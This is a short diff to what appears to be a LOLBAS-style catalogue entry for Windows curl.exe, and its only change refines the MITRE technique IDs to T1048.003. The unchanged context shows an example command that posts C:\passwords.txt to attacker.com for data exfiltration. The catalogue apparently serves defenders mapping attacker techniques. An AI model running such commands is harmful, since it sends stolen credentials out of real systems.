@@ -16,14 +16,14 @@ Commands:
     Usecase: Exfiltrate data to an external server
     Category: Upload
     Privileges: User
-    MitreID: T1048
+    MitreID: T1048.003
     OperatingSystem: Windows 10 1803+, Windows 11
   - Command: curl.exe -d @C:\passwords.txt https://attacker.com/collect
     Description: Upload file contents via HTTP POST
     Usecase: Exfiltrate data via HTTP POST request
     Category: Upload
     Privileges: User
-    MitreID: T1048
+    MitreID: T1048.003
     OperatingSystem: Windows 10 1803+, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\curl.exe
